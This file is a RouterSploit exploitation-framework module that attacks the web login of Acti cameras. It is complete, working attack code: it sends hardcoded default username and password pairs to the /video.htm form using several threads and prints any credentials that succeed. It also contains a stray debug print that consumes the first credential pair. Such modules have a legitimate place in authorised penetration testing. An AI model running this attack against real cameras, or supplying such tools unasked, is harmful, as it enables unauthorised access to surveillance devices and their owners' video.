from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Acti Camera Default Web Interface Creds - HTTP Form",
        "description": "Module performs default credentials check against Acti Camera Web Interface. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Acti Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:12345,admin:123456,Admin:12345,Admin:123456", "User:Pass or file with default ccredentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default credentials attack against Acti Camera Web Interface")

        data = LockedIterator(self.defaults)
        print(data.next())
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, creds):
        while running.is_set():
            try:
                username, password = creds.next().split(":", 1)

                data = {
                    "LOGIN_ACCOUNT": username,
                    "LOGIN_PASSWORD": password,
                    "LANGUAGE": "0",
                    "btnSubmit": "Login",
                }

                response = self.http_request(
                    method="POST",
                    path="/video.htm",
                    data=data
                )

                if response is None:
                    continue

                if ">Password<" not in response.text:
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
            except StopIteration:
                break

    def check(self):
        response = self.http_request(
            method="GET",
            path="/video.htm"
        )

        if response and ">Password<" in response.text:
            return True

        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
